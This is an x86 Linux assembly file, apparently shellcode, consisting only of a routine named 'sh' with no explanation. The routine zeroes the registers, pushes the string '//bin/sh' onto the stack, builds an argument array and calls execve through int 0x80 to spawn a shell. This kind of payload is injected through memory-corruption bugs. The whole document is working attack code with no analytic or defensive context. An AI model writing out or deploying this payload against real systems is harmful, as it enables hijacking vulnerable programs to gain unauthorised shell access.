.text
.globl sh

sh:
xorl %eax,%eax
xorl %ebx,%ebx
xorl %ecx,%ecx
xorl %edx,%edx

push %edx
push $0x68732f6e
push $0x69622f2f
mov %esp,%ebx
push %edx
push %ebx

mov %esp,%ecx

mov $11,%al
int $0x80

.string "" 
